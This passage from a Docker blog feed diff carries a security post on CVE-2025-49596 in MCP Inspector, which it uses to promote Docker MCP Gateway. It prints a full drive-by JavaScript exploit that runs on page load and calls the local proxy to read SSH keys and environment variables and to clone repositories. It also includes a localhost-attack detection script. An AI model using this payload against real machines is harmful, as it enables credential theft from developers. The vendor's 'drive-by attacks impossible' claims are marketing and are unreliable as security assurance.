@@ -1,6 +1,6 @@
 Docker
 https://www.docker.com
-Fri, 19 Sep 2025 14:26:15 +0000
+Mon, 22 Sep 2025 22:13:59 +0000
 en-US
 hourly
 1
@@ -10,6 +10,586 @@ Docker
 https://www.docker.com
 32
 32
+MCP Horror Stories: The Drive-By Localhost Breach
+https://www.docker.com/blog/mpc-horror-stories-cve-2025-49596-local-host-breach/
+Ajeet Singh Raina
+Tue, 23 Sep 2025 13:00:00 +0000
+Products
+Docker
+MCP
+MCP server
+security
+https://www.docker.com/?p=77890
+This is Part 4 of our MCP Horror Stories series, where we examine real-world security incidents that expose the devastating vulnerabilities in AI infrastructure and demonstrate how Docker MCP Gateway provides enterprise-grade protection against sophisticated attack vectors. The Model Context Protocol (MCP) has transformed how developers integrate AI agents with their development environments. Tools like...
+<p>This is Part 4 of our MCP Horror Stories series, where we examine real-world security incidents that expose the devastating vulnerabilities in AI infrastructure and demonstrate how Docker MCP Gateway provides enterprise-grade protection against sophisticated attack vectors.</p>
+<p>The Model Context Protocol (MCP) has transformed how developers integrate AI agents with their development environments. Tools like MCP Inspector have become essential for debugging and monitoring MCP communications, with over 38,000 weekly downloads making it one of the most popular utilities in the ecosystem. But as our previous issues revealed, from the <a href="https://www.docker.com/blog/mcp-horror-stories-the-supply-chain-attack/">mcp-remote supply chain attack (Part 2)</a> to the <a href="https://www.docker.com/blog/mcp-horror-stories-github-prompt-injection/">GitHub prompt injection data heist (Part 3)</a>, this convenience comes at a devastating security cost.</p>
+<p>Today’s horror story strikes at the heart of this essential development infrastructure: MCP Inspector. This tool itself has become a weapon of mass compromise for <a href="https://www.docker.com/blog/mcp-security-explained/">MCP security</a>. When the tool developers rely on to debug their AI integrations becomes the attack vector for system takeover, no development environment is safe. CVE-2025-49596, a critical vulnerability in MCP Inspector, transforms this trusted debugging utility into a drive-by-attack platform. The result enables attackers to compromise developer machines simply by tricking them into visiting a malicious website.</p>
+<h2 class="wp-block-heading"><strong>Why This Series Matters</strong></h2>
+<p>Each Horror Story demonstrates how laboratory security findings translate into real-world breaches that destroy businesses and compromise sensitive data. These aren&#8217;t theoretical vulnerabilities that require complex exploitation chains. These are weaponized attack vectors that hackers actively deploy against unsuspecting development teams, turning trusted AI tools into backdoors for system compromise.</p>
+<p>Our goal is to show the human cost behind the statistics, reveal how these attacks unfold in production environments, and provide concrete guidance for protecting your AI development infrastructure through Docker&#8217;s defense-in-depth security architecture.</p>
+<h2 class="wp-block-heading"><strong>Today&#8217;s Horror Story: The Drive-by Localhost Exploitation Attack</strong></h2>
+<p>In June 2025,<strong> </strong><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-49596" rel="nofollow noopener" target="_blank">CVE-2025-49596</a> was first reported to the National Vulnerability Database (NVD) and subsequently investigated by multiple security research teams, including <a href="https://www.oligo.security/blog/critical-rce-vulnerability-in-anthropic-mcp-inspector-cve-2025-49596" rel="nofollow noopener" target="_blank">Oligo Security</a> and <a href="https://www.tenable.com/cve/CVE-2025-49596" rel="nofollow noopener" target="_blank">Tenable Security Research</a>. This critical vulnerability transforms everyday web browsing into a system compromise vector. With a devastating CVSS score of 9.4 out of 10, this vulnerability enables attackers to compromise developer machines simply by tricking them into visiting a malicious website—no downloads, no phishing emails, no social engineering required.<br></p>
+<h3 class="wp-block-heading">What’s CVE-2025-49596?</h3>
+<p>CVE-2025-49596 is a vulnerability that exposes a dangerous new class of browser-based attacks specifically targeting AI developer tools. It represents one of the first critical remote code execution flaws in Anthropic&#8217;s MCP ecosystem.&nbsp;</p>
+<p>Once attackers achieve code execution on a developer&#8217;s machine, they can steal sensitive data, install persistent backdoors, and move laterally across enterprise networks. This creates serious security risks for AI development teams, open-source projects, and enterprise organizations that have adopted MCP as part of their AI infrastructure.</p>
+<p>The attack targets <a href="https://modelcontextprotocol.io/legacy/tools/inspector" rel="nofollow noopener" target="_blank">MCP Inspector,</a> a popular debugging tool that developers run locally to monitor AI agent communications. When developers visit websites containing malicious JavaScript, the code silently connects to the local MCP Inspector instance and exploits protocol vulnerabilities to achieve remote code execution on the victim&#8217;s development machine.</p>
+<p>Note: Versions of MCP Inspector below 0.14.1 are vulnerable to remote code execution due to lack of authentication between the Inspector client and proxy, allowing unauthenticated requests to launch MCP commands over stdio. Users should immediately upgrade to version 0.14.1 or later to address these vulnerabilities.</p>
+<p><strong>In this issue, you&#8217;ll learn:</strong></p>
+<ul class="wp-block-list">
+<li>How drive-by browser attacks bypass traditional network security</li>
+<li>Why localhost-exposed MCP services create enterprise-wide attack surfaces</li>
+<li>The specific exploitation techniques that turn debugging tools into backdoors</li>
+<li>How Docker MCP Gateway&#8217;s network isolation prevents entire classes of localhost attacks</li>
+</ul>
+<p>The story begins with something every developer does hundreds of times daily: opening a website in their browser…</p>
+<div class="wp-block-ponyo-image">
+<img fetchpriority="high" decoding="async" width="788" height="1038" src="https://www.docker.com/app/uploads/2025/09/image1-1.png" class="attachment-full size-full" alt="comic depicting the drive-by localhost exploitation attack; when browsing becomes a backdoor" srcset="https://www.docker.com/app/uploads/2025/09/image1-1.png 788w, https://www.docker.com/app/uploads/2025/09/image1-1-228x300.png 228w, https://www.docker.com/app/uploads/2025/09/image1-1-777x1024.png 777w" sizes="(max-width: 788px) 100vw, 788px" title="- image1 1">
+</div>
+<p><em>Caption: comic depicting the drive-by localhost exploitation attack; when browsing becomes a backdoor</em></p>
+<h2 class="wp-block-heading"><strong>The Problem</strong></h2>
+<p>MCP Inspector is a developer tool for testing and debugging MCP servers. The tool runs as a local web service to help developers debug their AI integrations.&nbsp;</p>
+<p>The typical vulnerable setup exposes a debugging interface on localhost that accepts connections from web browsers without any security controls:</p>
+<div class="wp-block-syntaxhighlighter-code "><pre class="brush: bash; gutter: false; title: ; notranslate">
+# Traditional vulnerable setup
+npx @modelcontextprotocol/inspector
+# Starts proxy server on http://0.0.0.0:6277
+# Starts web UI on http://127.0.0.1:6274
+# Accepts HTTP requests from ANY origin via /sse endpoint
+# No authentication or access controls
+</pre></div>
+<p>This creates a dangerous attack surface: any website you visit can potentially connect to your local MCP Inspector instance through JavaScript and exploit protocol vulnerabilities to compromise your development environment.</p>
+<p>Here&#8217;s what makes this particularly insidious: MCP Inspector is designed to inspect and manipulate MCP communications. When attackers gain control of this debugging interface, they can intercept, modify, or inject malicious tool calls into any AI agent connected to the local MCP ecosystem.</p>
+<h2 class="wp-block-heading"><strong>The Scale of the Problem</strong></h2>
+<p>The impact is staggering. MCP Inspector has been <a href="https://www.npmjs.com/package/@modelcontextprotocol/inspector" rel="nofollow noopener" target="_blank">downloaded</a> over 78,000 times per week, making this vulnerability a drive-by attack vector affecting hundreds of thousands of developer environments. The tool is featured in debugging guides across major AI platforms and is considered essential infrastructure for MCP development.</p>
+<p>What makes this attack particularly dangerous:</p>
+<ul class="wp-block-list">
+<li><strong>Universal Attack Vector</strong>: Every developer running MCP Inspector becomes vulnerable to drive-by attacks from any website</li>
+<li><strong>No User Interaction Required</strong>: Simply visiting a malicious website triggers the compromise</li>
+<li><strong>Enterprise Exposure</strong>: Affects organizations using Tenable&#8217;s security tools and other enterprise MCP integrations</li>
+<li><strong>Silent Compromise</strong>: Attacks leave minimal forensic evidence, making detection extremely difficult</li>
+</ul>
+<h2 class="wp-block-heading"><strong>How the Attack Works</strong></h2>
+<p>The vulnerability exploits the fundamental architecture of web-based localhost services combined with MCP Inspector&#8217;s privileged access to AI agent communications. </p>
+<h3 class="wp-block-heading"><strong>MCP Inspector Architecture</strong></h3>
+<p>The tool consists of two critical components that work together to provide debugging capabilities, but also create the attack surface exploited in CVE-2025-49596:</p>
+<p><strong>1. MCP Inspector Client (MCPI)</strong>: A React-based web UI that provides an interactive interface for testing and debugging MCP servers. This client runs in your browser at <code>http://localhost:6274</code> and connects to the proxy server.</p>
+<p><strong>2. MCP Proxy (MCPP)</strong>: A Node.js server acting as a protocol bridge, connecting the web UI to MCP servers via multiple transport methods (stdio, Server-Sent Events, streamable-http). This proxy runs on port <code>6277</code> and has permissions to spawn local processes and connect to any specified MCP server.</p>
+<p><strong>Port Numbers</strong>: The default ports 6274 and 6277 are derived from the T9 dialpad mapping of MCPI and MCPP, making them predictable and easy for attackers to discover.</p>
+<div class="wp-block-ponyo-image">
+<img decoding="async" width="1522" height="914" src="https://www.docker.com/app/uploads/2025/09/image2-1.png" class="attachment-full size-full" alt="MCP Inspector Architecture and Attack Surface" srcset="https://www.docker.com/app/uploads/2025/09/image2-1.png 1522w, https://www.docker.com/app/uploads/2025/09/image2-1-500x300.png 500w, https://www.docker.com/app/uploads/2025/09/image2-1-1110x667.png 1110w" sizes="(max-width: 1522px) 100vw, 1522px" title="- image2 1">
+</div>
+<p><em>Caption: MCP Inspector Architecture and Attack Surface</em><br></p>
+<p>Here&#8217;s the attack sequence:</p>
+<ol class="wp-block-list">
+<li><strong>Innocent Browsing</strong>: Developer visits what appears to be a legitimate website (technical blog, documentation site, social media)</li>
+<li><strong>Malicious JavaScript Execution</strong>: Website contains hidden JavaScript that scans for common localhost ports</li>
+<li><strong>MCP Inspector Discovery:</strong> Script discovers MCP Inspector proxy on <code>http://0.0.0.0:6277</code></li>
+<li><strong>HTTP Endpoint Exploitation:</strong> Malicious code sends HTTP requests to <code>/sse</code> endpoint exploiting 0.0.0.0-day vulnerability</li>
+<li><strong>Tool Call Injection</strong>: Attacker gains control of MCP Inspector and can inject malicious tool calls into connected AI agents</li>
+<li><strong>System Compromise</strong>: Through AI agent tool access, attacker achieves file system access, network connectivity, and potential container escape</li>
+</ol>
+<p>The attack succeeds because MCP Inspector trusts connections from localhost and lacks proper access controls, creating a bridge between web content and local AI agent infrastructure.</p>
+<h2 class="wp-block-heading"><strong>Technical Breakdown: The Actual Attack</strong></h2>
+<p>Here&#8217;s how a developer&#8217;s machine gets compromised through a simple website visit:</p>
+<h3 class="wp-block-heading"><strong>1. Malicious Website Setup</strong></h3>
+<p>The attacker creates or compromises a website with hidden JavaScript payload:</p>
+<div class="wp-block-syntaxhighlighter-code "><pre class="brush: bash; gutter: false; title: ; notranslate">
+&lt;!-- Hidden attack payload --&gt;
+&lt;script&gt;
+// MCP Inspector exploitation using real CVE-2025-49596 method
+function exploitMCPInspector() {
+// Test if MCP Inspector is running
+fetch(&quot;http://0.0.0.0:6277/sse?transportType=stdio&amp;command=echo&amp;args=test&quot;, {
+&quot;headers&quot;: {
+&quot;accept&quot;: &quot;*/*&quot;,
+&quot;cache-control&quot;: &quot;no-cache&quot;
+},
+&quot;method&quot;: &quot;GET&quot;,
+&quot;mode&quot;: &quot;no-cors&quot;,
+// Critical: bypasses CORS protection
+&quot;credentials&quot;: &quot;omit&quot;
+}).then(() =&gt; {
+// MCP Inspector detected - execute malicious payloads
+stealCredentials();
+enumerateSystem();
+}).catch(() =&gt; {
+// Try common development ports as fallback
+scanCommonPorts();
+});
+}
+// Real credential theft using stdio transport
+function stealCredentials() {
+// Steal SSH private key
+fetch(&quot;http://0.0.0.0:6277/sse?transportType=stdio&amp;command=cat&amp;args=%2Fhome%2Fuser%2F.ssh%2Fid_rsa&quot;, {
+&quot;method&quot;: &quot;GET&quot;, &quot;mode&quot;: &quot;no-cors&quot;
+});
+// Read environment variables
+fetch(&quot;http://0.0.0.0:6277/sse?transportType=stdio&amp;command=env&amp;args=&quot;, {
+&quot;method&quot;: &quot;GET&quot;, &quot;mode&quot;: &quot;no-cors&quot;
+});
+}
+// Execute on page load
+document.addEventListener(&#039;DOMContentLoaded&#039;, exploitMCPInspector);
+&lt;/script&gt;
+</pre></div>
+<p>This attack succeeds because it exploits a fundamental flaw in how browsers handle the IP address <code>0.0.0.0</code>. When a developer visits what appears to be a legitimate website—perhaps a technical blog, GitHub page, or even a compromised news site—the malicious JavaScript executes invisibly in the background. The critical insight is that browsers incorrectly treat <code>0.0.0.0</code> as equivalent to localhost, allowing the JavaScript to bypass same-origin policy restrictions that would normally prevent external websites from accessing local services. </p>
+<p>The <code>mode: "no-cors"</code> parameter is particularly insidious because it tells the browser to send the request without checking CORS policies, essentially treating the attack as a simple image or stylesheet request. Meanwhile, the victim continues browsing normally, completely unaware that their local MCP Inspector proxy is being silently probed and potentially compromised. This attack requires zero user interaction beyond the simple act of visiting a webpage—no downloads, no permission prompts, no suspicious behavior that would alert the victim.</p>
+<h3 class="wp-block-heading"><strong>2. Developer Visits Website</strong></h3>
+<p>Developer innocently visits the malicious website while working on MCP development:</p>
+<div class="wp-block-syntaxhighlighter-code "><pre class="brush: bash; gutter: false; title: ; notranslate">
+# Developer has MCP Inspector running
+npx @modelcontextprotocol/inspector
+# ✓ Proxy server on http://0.0.0.0:6277
+# ✓ HTTP endpoint: http://0.0.0.0:6277/sse
+# ✓ No authentication required
+# ✓ Accepts requests from any origin
+</pre></div>
+<h3 class="wp-block-heading"><strong>3. Localhost Discovery and Exploitation</strong></h3>
+<p>The malicious JavaScript executes and discovers the local MCP Inspector:</p>
+<div class="wp-block-syntaxhighlighter-code "><pre class="brush: jscript; gutter: false; title: ; notranslate">
+// Attack payload discovers MCP Inspector
+HTTP request to http://0.0.0.0:6277/sse: SUCCESS
+// 0.0.0.0-day vulnerability bypasses same-origin policy
+// No authentication required
+// Full access to MCP Inspector stdio transport
+</pre></div>
+<h3 class="wp-block-heading"><strong>4. MCP Protocol Abuse</strong></h3>
+<p>The attacker now has control of the MCP Inspector interface and can access private files:<br></p>
+<div class="wp-block-syntaxhighlighter-code "><pre class="brush: jscript; title: ; notranslate">
+// Real CVE-2025-49596 exploitation via /sse endpoint
+// Steal SSH private key
+fetch(&quot;http://0.0.0.0:6277/sse?transportType=stdio&amp;command=cat&amp;args=%2Fhome%2Fuser%2F.ssh%2Fid_rsa&quot;, {
+&quot;method&quot;: &quot;GET&quot;, &quot;mode&quot;: &quot;no-cors&quot;
+});
+// Read environment variables and secrets
+fetch(&quot;http://0.0.0.0:6277/sse?transportType=stdio&amp;command=env&amp;args=&quot;, {
+&quot;method&quot;: &quot;GET&quot;, &quot;mode&quot;: &quot;no-cors&quot;
+});
+// Access private repositories via git credentials
+fetch(&quot;http://0.0.0.0:6277/sse?transportType=stdio&amp;command=git&amp;args=clone%20https://github.com/company/secrets.git&quot;, {
+&quot;method&quot;: &quot;GET&quot;, &quot;mode&quot;: &quot;no-cors&quot;
+});
+</pre></div>
+<h3 class="wp-block-heading">Critical Browser Vulnerability: <a href="https://en.wikipedia.org/wiki/0.0.0.0#0.0.0.0_day_exploit" rel="nofollow noopener" target="_blank">0.0.0.0-day</a></h3>
+<p>The attack exploits a browser implementation flaw where major browsers incorrectly treat the IP address <code>0.0.0.0</code> as equivalent to localhost, allowing malicious websites to bypass same-origin policy restrictions.</p>
+<p>When JavaScript makes a request to <code>http://0.0.0.0:6277</code>, browsers process it as a local request rather than blocking it, creating a bridge between public websites and private localhost services. This behavior remains unpatched across major browsers as of 2025, making any development tool that binds to <code>0.0.0.0</code> vulnerable to drive-by attacks.</p>
+<p>In CVE-2025-49596, this browser flaw is the critical enabler that allows external websites to reach the local MCP Inspector proxy and achieve remote code execution through a simple website visit.</p>
+<h2 class="wp-block-heading"><strong>The Impact</strong></h2>
+<p>Within seconds of visiting the malicious website, the attacker now has:</p>
+<ul class="wp-block-list">
+<li><strong>Complete MCP Inspector Control</strong>: Full access to debug and manipulate AI agent communications</li>
+<li><strong>AI Agent Hijacking</strong>: Ability to inject malicious tool calls into connected AI assistants</li>
+<li><strong>Credential Harvesting</strong>: Access to SSH keys, API tokens, and environment variables</li>
+<li><strong>Private Repository Access</strong>: Leverage AI agent GitHub tokens to steal proprietary code</li>
+<li><strong>Container Intelligence</strong>: Knowledge of local Docker environment and potential escape vectors</li>
+<li><strong>Persistent Backdoor</strong>: Ongoing ability to monitor and manipulate AI development workflows</li>
+</ul>
+<p>All achieved through a single website visit with no user interaction required.</p>
+<h2 class="wp-block-heading"><strong>How Docker MCP Gateway Eliminates This Attack Vector</strong></h2>
+<p>Docker MCP Gateway fundamentally eliminates drive-by localhost exploitation attacks through <strong>network isolation architecture</strong> that prevents external web content from reaching local MCP services. Unlike traditional MCP setups that expose debugging interfaces directly to localhost (creating the attack surface), Docker MCP Gateway creates secure, isolated communication channels that external JavaScript cannot access.<br></p>
+<h3 class="wp-block-heading"><strong>Core Defense: Network Isolation Architecture</strong></h3>
+<p>The fundamental vulnerability in CVE-2025-49596 is that MCP Inspector exposes a web service on localhost that accepts connections from any origin. Malicious websites exploit this by scanning localhost ports and connecting directly to the MCP Inspector WebSocket endpoint.</p>
+<p>Docker MCP Gateway eliminates this attack vector entirely by <strong>removing the localhost exposure</strong>:</p>
+<div class="wp-block-syntaxhighlighter-code "><pre class="brush: bash; gutter: false; title: ; notranslate">
+# Traditional vulnerable setup (CVE-2025-49596)
+npx @modelcontextprotocol/inspector
+# ✗ Exposes http://0.0.0.0:6277
+# ✗ HTTP endpoint: http://0.0.0.0:6277/sse
+# ✗ Accepts requests from ANY origin
+# ✗ No authentication required
+# ✗ Malicious websites can connect directly
+# Docker MCP Gateway (attack-proof)
+docker mcp gateway run --transport stdio
+# ✓ No localhost web interface exposed
+# ✓ Communication via secure stdio transport
+# ✓ No WebSocket endpoints for browsers to access
+# ✓ External JavaScript cannot connect
+# ✓ Drive-by attacks impossible
+</pre></div>
+<h3 class="wp-block-heading"><strong>Network Security Controls</strong></h3>
+<p>When localhost exposure is required for debugging, Docker MCP Gateway provides granular network controls:</p>
+<div class="wp-block-syntaxhighlighter-code "><pre class="brush: bash; gutter: false; title: ; notranslate">
+# Secure debugging configuration
+docker mcp gateway run \
+--transport streaming \
+--port 8080 \
+--log-calls \
+# Full audit trail
+--verbose
+</pre></div>
+<p>This configuration ensures that even if a debugging interface exists, it&#8217;s protected against browser-based attacks through authentication requirements and CORS restrictions.<br></p>
+<h3 class="wp-block-heading"><strong>Container Network Isolation</strong></h3>
+<p>Beyond eliminating localhost exposure, Docker MCP Gateway provides defense-in-depth through container network isolation:</p>
+<div class="wp-block-syntaxhighlighter-code "><pre class="brush: bash; gutter: false; title: ; notranslate">
+# Production hardened setup with network isolation
+docker mcp gateway run \
+--verify-signatures \
+# Supply chain protection
+--block-network \
+# Zero-trust networking
+--cpus 1 \
+# Resource limits
+--memory 1Gb \
+# Memory constraints
+--log-calls \
+# Comprehensive logging
+--verbose
+# Full audit trail
+</pre></div>
+<p>This creates multiple layers of protection:</p>
+<ol class="wp-block-list">
+<li><strong>No Localhost Exposure</strong>: External JavaScript cannot reach MCP services</li>
+<li><strong>Container Isolation</strong>: Even if compromised, attackers are contained</li>
+<li><strong>Resource Limits</strong>: Prevents resource exhaustion attacks</li>
+<li><strong>Comprehensive Monitoring</strong>: All activities logged and auditable</li>
+</ol>
+<h3 class="wp-block-heading"><strong>Advanced Defense: Interceptor-Based Protection</strong></h3>
+<p>For organizations requiring additional security, Docker MCP Gateway&#8217;s interceptor system can detect and block suspicious localhost exploitation attempts:</p>
+<div class="wp-block-syntaxhighlighter-code "><pre class="brush: bash; gutter: false; title: ; notranslate">
+# Deploy localhost attack detection
+docker mcp gateway run \
+--interceptor &#039;before:exec:/scripts/localhost-attack-detector.sh&#039; \
+--interceptor &#039;after:exec:/scripts/audit-logger.sh&#039; \
+--servers github-official
+</pre></div>
+<p>The <code>localhost-attack-detector.sh</code> interceptor can identify attack patterns:</p>
+<div class="wp-block-syntaxhighlighter-code "><pre class="brush: bash; gutter: false; title: ; notranslate">
+#!/bin/bash
+# Localhost Attack Detection Interceptor
+# Read tool call data
+tool_call=$(cat)
+tool_name=$(echo &quot;$tool_call&quot; | jq -r &#039;.method&#039;)
+arguments=$(echo &quot;$tool_call&quot; | jq -r &#039;.params.arguments&#039;)
+# Detect suspicious localhost access patterns
+if echo &quot;$arguments&quot; | grep -E &quot;(localhost|127\.0\.0\.1|0\.0\.0\.0|::1|127\.1)&quot; &gt; /dev/null; then
+if echo &quot;$arguments&quot; | grep -E &quot;(port|socket|websocket)&quot; &gt; /dev/null; then
+echo &quot;BLOCKING LOCALHOST EXPLOITATION ATTEMPT!&quot; &gt;&amp;2
+echo &quot;Tool: $tool_name&quot; &gt;&amp;2
+echo &quot;Suspicious Args: $arguments&quot; &gt;&amp;2
+# Block the request
+cat &lt;&lt; EOF
+{
+&quot;content&quot;: &#x5B;
+{
+&quot;text&quot;: &quot;SECURITY BLOCK: Localhost exploitation attempt prevented. This request has been blocked and logged for security review.&quot;
+}
+],
+&quot;isError&quot;: true
+}
+EOF
+exit 1
+fi
+fi
+# Allow legitimate requests
+exit 0
+</pre></div>
+<h3 class="wp-block-heading"><strong>Advanced Defense: Containerised Docker MCP Gateway Deployment</strong></h3>
+<p>For maximum security, Docker MCP Gateway can run inside its own container, creating multiple layers of isolation:</p>
+<div class="wp-block-syntaxhighlighter-code "><pre class="brush: bash; gutter: false; title: ; notranslate">
+docker run -d \
+--name mcp-gateway \
+--network mcp-isolated \
+-p 8811:8811 \
+-v /var/run/docker.sock:/var/run/docker.sock:ro \
+-v ~/.docker/mcp:/mcp:ro \
+--use-api-socket \
+docker/mcp-gateway \
+--catalog=/mcp/catalogs/docker-mcp.yaml \
+--config=/mcp/config.yaml \
+--registry=/mcp/registry.yaml \
+--tools-config=/mcp/tools.yaml \
+--transport=sse \
+--port=8811
+</pre></div>
+<p>This command deploys Docker MCP Gateway as a dedicated container service that eliminates the localhost attack surface exploited by CVE-2025-49596. The container runs detached (<code>-d</code>) on an isolated network (<code>--network mcp-isolated</code>) and exposes port 8811 for secure AI client connections. Two critical volume mounts enable functionality while maintaining security: the Docker socket mount (<code>/var/run/docker.sock:ro</code>) allows the gateway to manage other MCP server containers, while the MCP configuration mount (<code>~/.docker/mcp:/mcp:ro</code>) provides read-only access to catalogs, server registries, and tool configurations. The <code>--use-api-socket flag</code> enables communication with Docker Desktop&#8217;s API for secrets management and container orchestration.</p>
+<p>The gateway launches with comprehensive configuration files that define available MCP servers (<code>--catalog</code>), enabled services (<code>--registry</code>), runtime settings (<code>--config</code>), and tool permissions (<code>--tools-config</code>). By using Server-Sent Events transport (<code>--transport=sse</code>) on port 8811, the containerized gateway creates a secure communication channel that external JavaScript cannot reach through browser-based attacks. </p>
+<p>This architecture fundamentally prevents CVE-2025-49596 exploitation because malicious websites cannot connect to localhost services that don&#8217;t exist on the host &#8211; the gateway operates entirely within its own container boundary, breaking the attack chain that relies on direct localhost access.</p>
+<h2 class="wp-block-heading"><strong>Attack Flow Transformation: Before vs After Docker MCP Gateway</strong></h2>
+<div style="--row-column-count: 5;" class="wp-block-ponyo-table style__default">
+<table class="responsive-table">
+<tbody class="wp-block-ponyo-table-body">
+<tr class="wp-block-ponyo-table-header">
+<th class="wp-block-ponyo-cell" data-responsive-table-heading="Step">
+<p>Step</p>
+</th>
+<th class="wp-block-ponyo-cell" data-responsive-table-heading="Attack Phase">
+<p>Attack Phase</p>
+</th>
+<th class="wp-block-ponyo-cell" data-responsive-table-heading="Traditional MCP">
+<p>Traditional MCP</p>
+</th>
+<th class="wp-block-ponyo-cell" data-responsive-table-heading="Docker MCP Gateway">
+<p>Docker MCP Gateway</p>
+</th>
+<th class="wp-block-ponyo-cell" data-responsive-table-heading="Gateway Defense">
+<p>Gateway Defense</p>
+</th>
+</tr>
+<tr class="wp-block-ponyo-table-row">
+<td class="wp-block-ponyo-cell">
+<p>1</p>
+</td>
+<td class="wp-block-ponyo-cell">
+<p>Website Visit</p>
+</td>
+<td class="wp-block-ponyo-cell">
+<p>Developer browses malicious site ✓</p>
+</td>
+<td class="wp-block-ponyo-cell">
+<p>Developer browses malicious site ✓</p>
+</td>
+<td class="wp-block-ponyo-cell">
+<p>ALLOW – Normal browsing</p>
+</td>
+</tr>
+<tr class="wp-block-ponyo-table-row">
+<td class="wp-block-ponyo-cell">
+<p>2</p>
+</td>
+<td class="wp-block-ponyo-cell">
+<p>0.0.0.0-day Exploit</p>
+</td>
+<td class="wp-block-ponyo-cell">
+<p>JavaScript targets 0.0.0.0:6277  ✓</p>
+</td>
+<td class="wp-block-ponyo-cell">
+<p>JavaScript targets localhost ports ✗</p>
+</td>
+<td class="wp-block-ponyo-cell">
+<p>BLOCK – No exposed ports</p>
+</td>
+</tr>
+<tr class="wp-block-ponyo-table-row">
+<td class="wp-block-ponyo-cell">
+<p>3</p>
+</td>
+<td class="wp-block-ponyo-cell">
+<p>Service Discovery</p>
+</td>
+<td class="wp-block-ponyo-cell">
+<p>Finds MCP Inspector/sse endpoint ✓</p>
+</td>
+<td class="wp-block-ponyo-cell">
+<p>No services found ✗</p>
+</td>
+<td class="wp-block-ponyo-cell">
+<p>PREVENTED – Network isolation</p>
+</td>
+</tr>
+<tr class="wp-block-ponyo-table-row">
+<td class="wp-block-ponyo-cell">
+<p>4</p>
+</td>
+<td class="wp-block-ponyo-cell">
+<p>HTTP Exploitation</p>
+</td>
+<td class="wp-block-ponyo-cell">
+<p>HTTP fetch to 0.0.0.0:6277/sse ✓</p>
+</td>
+<td class="wp-block-ponyo-cell">
+<p><em>Would not reach this step</em></p>
+</td>
+<td class="wp-block-ponyo-cell">
+<p>PREVENTED – No connection possible</p>
+</td>
+</tr>
+<tr class="wp-block-ponyo-table-row">
+<td class="wp-block-ponyo-cell">
+<p>5</p>
+</td>
+<td class="wp-block-ponyo-cell">
+<p>System Command Execution</p>
+</td>
+<td class="wp-block-ponyo-cell">
+<p>Executes stdio commands ✓</p>
+</td>
+<td class="wp-block-ponyo-cell">
+<p><em>Would not reach this step</em></p>
+</td>
+<td class="wp-block-ponyo-cell">
+<p>PREVENTED – No connection possible</p>
+</td>
+</tr>
+<tr class="wp-block-ponyo-table-row">
+<td class="wp-block-ponyo-cell">
+<p>6</p>
+</td>
+<td class="wp-block-ponyo-cell">
+<p>Credential Theft</p>
+</td>
+<td class="wp-block-ponyo-cell">
+<p>Steals SSH keys, env vars ✓</p>
+</td>
+<td class="wp-block-ponyo-cell">
+<p><em>Would not reach this step</em></p>
+</td>
+<td class="wp-block-ponyo-cell">
+<p>PREVENTED &#8211; Attack chain broken</p>
+</td>
+</tr>
+<tr class="wp-block-ponyo-table-row">
+<td class="wp-block-ponyo-cell">
+<p>RESULT</p>
+</td>
+<td class="wp-block-ponyo-cell">
+<p>Final Outcome</p>
+</td>
+<td class="wp-block-ponyo-cell">
+<p><strong>Complete system compromise: Credentials stolen, Private repos accessed, Container escape achieved</strong></p>
+</td>
+<td class="wp-block-ponyo-cell">
+<p><strong>Attack neutralized: No localhost exposure, No browser connectivity, Full system protection</strong></p>
+</td>
+<td class="wp-block-ponyo-cell">
+<p><strong>SUCCESS – Drive-by attacks impossible</strong></p>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h3 class="wp-block-heading"><strong>Practical Security Improvements</strong></h3>
+<p>Here&#8217;s what you get with Docker MCP Gateway&#8217;s localhost protection:</p>
+<div style="--row-column-count: 3;" class="wp-block-ponyo-table style__default">
+<table class="responsive-table">
+<tbody class="wp-block-ponyo-table-body">
+<tr class="wp-block-ponyo-table-header">
+<th class="wp-block-ponyo-cell" data-responsive-table-heading="Security Aspect">
+<p>Security Aspect</p>
+</th>
+<th class="wp-block-ponyo-cell" data-responsive-table-heading="Traditional MCP">
+<p>Traditional MCP</p>
+</th>
+<th class="wp-block-ponyo-cell" data-responsive-table-heading="Docker MCP Gateway">
+<p>Docker MCP Gateway</p>
+</th>
+</tr>
+<tr class="wp-block-ponyo-table-row">
+<td class="wp-block-ponyo-cell">
+<p>Localhost Exposure</p>
+</td>
+<td class="wp-block-ponyo-cell">
+<p>Web services on common ports</p>
+</td>
+<td class="wp-block-ponyo-cell">
+<p>No browser-accessible endpoints</p>
+</td>
+</tr>
+<tr class="wp-block-ponyo-table-row">
+<td class="wp-block-ponyo-cell">
+<p>WebSocket Security</p>
+</td>
+<td class="wp-block-ponyo-cell">
+<p>Unprotected ws:// connections</p>
+</td>
+<td class="wp-block-ponyo-cell">
+<p>No WebSocket endpoints for browsers</p>
+</td>
+</tr>
+<tr class="wp-block-ponyo-table-row">
+<td class="wp-block-ponyo-cell">
+<p>Authentication</p>
+</td>
+<td class="wp-block-ponyo-cell">
+<p>None required</p>
+</td>
+<td class="wp-block-ponyo-cell">
+<p>Optional strong authentication</p>
+</td>
+</tr>
+<tr class="wp-block-ponyo-table-row">
+<td class="wp-block-ponyo-cell">
+<p>CORS Protection</p>
+</td>
+<td class="wp-block-ponyo-cell">
+<p>Default browser access</p>
+</td>
+<td class="wp-block-ponyo-cell">
+<p>Configurable CORS restrictions</p>
+</td>
+</tr>
+<tr class="wp-block-ponyo-table-row">
+<td class="wp-block-ponyo-cell">
+<p>Network Controls</p>
+</td>
+<td class="wp-block-ponyo-cell">
+<p>Unrestricted localhost access</p>
+</td>
+<td class="wp-block-ponyo-cell">
+<p>Zero-trust network isolation</p>
+</td>
+</tr>
+<tr class="wp-block-ponyo-table-row">
+<td class="wp-block-ponyo-cell">
+<p>Container Security</p>
+</td>
+<td class="wp-block-ponyo-cell">
+<p>Host execution vulnerable</p>
+</td>
+<td class="wp-block-ponyo-cell">
+<p>Container isolation + escape prevention</p>
+</td>
+</tr>
+<tr class="wp-block-ponyo-table-row">
+<td class="wp-block-ponyo-cell">
+<p>Monitoring</p>
+</td>
+<td class="wp-block-ponyo-cell">
+<p>No visibility into attacks</p>
+</td>
+<td class="wp-block-ponyo-cell">
+<p>Real-time attack detection + logging</p>
+</td>
+</tr>
+<tr class="wp-block-ponyo-table-row">
+<td class="wp-block-ponyo-cell">
+<p>Attack Prevention</p>
+</td>
+<td class="wp-block-ponyo-cell">
+<p>Reactive security (post-breach)</p>
+</td>
+<td class="wp-block-ponyo-cell">
+<p>Proactive defense (prevent initial access)</p>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
